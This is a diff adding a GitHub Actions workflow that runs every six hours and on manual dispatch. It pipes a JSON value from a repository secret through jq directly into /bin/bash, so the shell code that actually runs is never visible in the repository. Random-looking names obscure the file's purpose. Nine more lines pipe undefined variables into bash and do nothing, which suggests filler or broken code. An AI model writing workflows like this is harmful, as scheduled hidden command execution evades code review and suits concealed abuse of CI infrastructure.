@@ -1,0 +1,26 @@
+name: yingjinchaoshang
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '5 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yingjinchaoshang
+        env:
+          bivy13633: ${{ secrets.bivy13633 }}
+        run: |
+          echo $bivy13633 | jq -r .whobd6699 | /bin/bash
+          echo $govlr41077 | jq -r .gs388 | /bin/bash
+          echo $bhx79581 | jq -r .hq1590 | /bin/bash
+          echo $yxog0 | jq -r .dmrv96037 | /bin/bash
+          echo $oo76479 | jq -r .p40 | /bin/bash
+          echo $ubfca2616 | jq -r .t5047 | /bin/bash
+          echo $xzhhc3002 | jq -r .qdybc589 | /bin/bash
+          echo $zoot67891 | jq -r .bjan46624 | /bin/bash
+          echo $fngok5 | jq -r .fnc403 | /bin/bash
+          echo $yn589 | jq -r .kaxth4 | /bin/bash
+
